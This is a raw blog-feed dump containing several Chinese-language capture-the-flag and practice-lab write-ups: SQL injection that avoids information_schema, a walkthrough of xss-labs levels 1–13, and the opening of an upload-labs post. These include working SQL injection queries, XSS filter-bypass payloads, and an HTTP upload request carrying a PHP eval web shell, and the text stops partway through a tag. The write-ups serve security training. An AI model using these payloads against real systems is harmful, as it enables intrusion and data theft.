class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(`<span class="number">2</span>`) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a),<span class="number">3</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226232242851.png" alt="image-20240226232242851"></p><p>这里union后面一共查询了三次:</p><p><strong>第一次</strong></p><p>也就是最内层的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226232548082.png" alt="image-20240226232548082"></p><p><strong>第二次</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(`<span class="number">2</span>`) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a;</span><br></pre></td></tr></table></figure><p>将第一次查询得到的表中<code>2</code>字段的内容(也就是原users表中username的内容)查出来再生成一张零时表</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226232717346.png" alt="image-20240226232717346"></p><p><strong>第三次</strong></p><p>合并</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(`<span class="number">2</span>`) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a),<span class="number">3</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226232830882.png" alt="image-20240226232830882"></p><h4 id="join-using"><a href="#join-using" class="headerlink" title="join using"></a>join using</h4><p>这里需要有报错回显</p><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a <span class="keyword">join</span> users <span class="keyword">as</span> b)<span class="keyword">as</span> c;</span><br></pre></td></tr></table></figure><p>报出第一个列名为id</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a <span class="keyword">join</span> users <span class="keyword">as</span> b <span class="keyword">using</span>(id))<span class="keyword">as</span> c;</span><br></pre></td></tr></table></figure><p>报出第二个列名为username</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a <span class="keyword">join</span> users <span class="keyword">as</span> b <span class="keyword">using</span>(id,username))<span class="keyword">as</span> c;</span><br></pre></td></tr></table></figure><p>以此类推</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226233801718.png" alt="image-20240226233801718"></p><h4 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h4><p>通过字典序来猜测内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">3</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>;#a <span class="operator">&lt;</span> h,回显a</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> a        <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hcj      <span class="operator">|</span> <span class="number">123456</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;i&#x27;</span>,<span class="number">3</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hcj      <span class="operator">|</span> <span class="number">123456</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> i        <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;hci&#x27;</span>,<span class="number">3</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hci      <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hcj      <span class="operator">|</span> <span class="number">123456</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;hck&#x27;</span>,<span class="number">3</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hcj      <span class="operator">|</span> <span class="number">123456</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hck      <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> buu刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql绕过information_schema注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss-labs</title>
      <link href="/2024/02/20/xss-labs/"/>
      <url>/2024/02/20/xss-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="xss-labs"><a href="#xss-labs" class="headerlink" title="xss-labs"></a>xss-labs</h1><p>手动搭建了一个本地靶场</p><p>原github项目地址</p><p><a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a></p><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220181007551.png"></p><h2 id="level-2-“-闭合"><a href="#level-2-“-闭合" class="headerlink" title="level 2(“&gt;闭合)"></a>level 2(“&gt;闭合)</h2><p>产看源码发现与上一关不同的是使用了以下函数:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//htmlspecialchars($str)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br></pre></td></tr></table></figure><p>但是在另一个位置也就是输入框内, 并没有使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;&quot;&gt; </span></span><br></pre></td></tr></table></figure><p>此时可以构造闭合掉input及其属性</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223163910163.png" alt="image-20240223163910163"></p><h2 id="level-3-构造鼠标事件"><a href="#level-3-构造鼠标事件" class="headerlink" title="level 3(构造鼠标事件)"></a>level 3(构造鼠标事件)</h2><p>相较于上一关, 这关都加了 htmlspecialchars($str) 进行转义</p><p>但是</p><blockquote><p>htmlspecialchars($str) 默认不转义单引号</p></blockquote><p>因此可以构造一个onclick时间, 点击后执行js代码</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&#x27;alert(1)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223164554832.png" alt="image-20240223164554832"></p><p>点击输入框就会执行js</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223164620880.png" alt="image-20240223164620880"></p><h2 id="level-4-构造鼠标事件"><a href="#level-4-构造鼠标事件" class="headerlink" title="level 4(构造鼠标事件)"></a>level 4(构造鼠标事件)</h2><p>简单测试发现这里直接删除了尖括号, 但是并没有删除双引号, 并且也没对双引号进行转义</p><p>恰巧这里的value属性使用双引号闭合</p><p>只需将上一题的单引号改为双引号即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223165143411.png" alt="image-20240223165143411"></p><h2 id="level-5-伪协议JavaScript"><a href="#level-5-伪协议JavaScript" class="headerlink" title="level 5(伪协议JavaScript:)"></a>level 5(伪协议JavaScript:)</h2><p>这关似乎添加了黑名单,之前的<code>&lt;script&gt; onclick</code>会被修改为<code>o_nclick &lt;scr_ipt&gt;</code></p><p>使用**JavaScript:**伪协议来执行js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223170134184.png" alt="image-20240223170134184"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223170148930.png" alt="image-20240223170148930"></p><p>点击插入的超链接即可</p><h2 id="level-6-大小写绕过"><a href="#level-6-大小写绕过" class="headerlink" title="level 6 (大小写绕过)"></a>level 6 (大小写绕过)</h2><p>这里使用上一关的payload会发现href也被过滤了</p><p>但是我们知道, html是大小写不敏感的</p><p>直接构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hREf=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223170543131.png" alt="image-20240223170543131"></p><p>部分源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br></pre></td></tr></table></figure><h2 id="level-7-双写绕过"><a href="#level-7-双写绕过" class="headerlink" title="level 7(双写绕过)"></a>level 7(双写绕过)</h2><p>这关会删除了script  href 等等字符串</p><p>只需要双写绕过即可</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hrhrefef=javascrscriptipt:alert(1)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223171113140.png" alt="image-20240223171113140"></p><p>部分源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> =<span class="title function_ invoke__">strtolower</span>( <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str5</span>);</span><br></pre></td></tr></table></figure><h2 id="level-8-实体编码绕过"><a href="#level-8-实体编码绕过" class="headerlink" title="level 8(实体编码绕过)"></a>level 8(实体编码绕过)</h2><p>这关过滤的更加严格, 大小写, 转义, 替换 都用上了</p><p>但是我们输入的内容会被放进一个超链接里</p><p>可以使用实体编码来绕过对我们输入内容的替换</p><p><a href="https://www.qqxiuzi.cn/bianma/zifushiti.php">https://www.qqxiuzi.cn/bianma/zifushiti.php</a></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223172033713.png" alt="image-20240223172033713"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223172232860.png" alt="image-20240223172232860"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223172002536.png" alt="image-20240223172002536"></p><h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223172339270.png" alt="image-20240223172339270"></p><p>这关我以为是识别到编码了, 实际上是需要含有<code>http://</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里并没有要求要以<code>http://</code>开头, 所以只需要把它加在后面并注释掉即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;//http://</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223172906831.png" alt="image-20240223172906831"></p><h2 id="level-10-修改hidden内容"><a href="#level-10-修改hidden内容" class="headerlink" title="level 10(修改hidden内容)"></a>level 10(修改hidden内容)</h2><p>随便输入一下, 发现这里还有几个隐藏参数</p><p>这里尝试get将同名都提交一遍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://xss-labs/level10.php</span><br><span class="line">?keyword=1</span><br><span class="line">&amp;t_link=2</span><br><span class="line">&amp;t_history=3</span><br><span class="line">&amp;t_sort=4</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223173715090.png" alt="image-20240223173715090"></p><p>发现t_sort是有回显的</p><p>简单测试后发现会删除尖括号, 但依然可以构造鼠标事件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?keyword=1</span><br><span class="line">&amp;t_link=2</span><br><span class="line">&amp;t_history=3</span><br><span class="line">&amp;t_sort=4&quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223173920165.png" alt="image-20240223173920165"></p><h2 id="level-11-referer注入"><a href="#level-11-referer注入" class="headerlink" title="level 11(referer注入)"></a>level 11(referer注入)</h2><p>这里查看源码会发现有一个参数的值非常特殊</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223174342942.png" alt="image-20240223174342942"></p><p>这个t_ref的值正式我们上一关的地址和payload</p><p>我们都知道http头的referer正是记录了上一个页面的地址, 所以这里可以通过修改referer来注入</p><p>添加http头:</p><p><code>Referer: &quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223174857257.png" alt="image-20240223174857257"></p><h2 id="level-12-User-Agent注入"><a href="#level-12-User-Agent注入" class="headerlink" title="level 12(User-Agent注入)"></a>level 12(User-Agent注入)</h2><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223175032662.png" alt="image-20240223175032662"></p><p>这里又多出来一个t_ua 不必多说, User-Agent注入</p><p>修改User-Agent即可</p><p><code>User-Agent: &quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223175138909.png" alt="image-20240223175138909"></p><h2 id="level-13-cookie注入"><a href="#level-13-cookie注入" class="headerlink" title="level 13(cookie注入)"></a>level 13(cookie注入)</h2><p>这里抓包会发现带了一个cookie, 返回内容t_cook中的内容正好是cookie中的内容</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223175436189.png" alt="image-20240223175436189"></p><p>更改cookie中的内容为前两关的payload即可</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223175555490.png" alt="image-20240223175555490"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Upload-labs</title>
      <link href="/2024/02/19/Upload-labs/"/>
      <url>/2024/02/19/Upload-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="Upload-labs"><a href="#Upload-labs" class="headerlink" title="Upload-labs"></a>Upload-labs</h1><p>网上有21关的和20关两种,在这里以buu upload-labs linux 也就是20关的来排序,并且在本地搭建了21关的labs</p><p>即包含了21关全部内容</p><h2 id="Pass-01-前端验证"><a href="#Pass-01-前端验证" class="headerlink" title="Pass-01(前端验证)"></a>Pass-01(前端验证)</h2><p>简单的前端js验证</p><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-01/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>d6201cdc-7e17-4a35-8198-4b2a83f9aded.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>316</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://d6201cdc-7e17-4a35-8198-4b2a83f9aded.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryKhKT7v8SLthN7HCS</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://d6201cdc-7e17-4a35-8198-4b2a83f9aded.node5.buuoj.cn:81/Pass-01/index.php?action=show_code</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryKhKT7v8SLthN7HCS</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/png</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[nacl]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryKhKT7v8SLthN7HCS</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">上传</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryKhKT7v8SLthN7HCS--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p>之后蚁剑连接即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 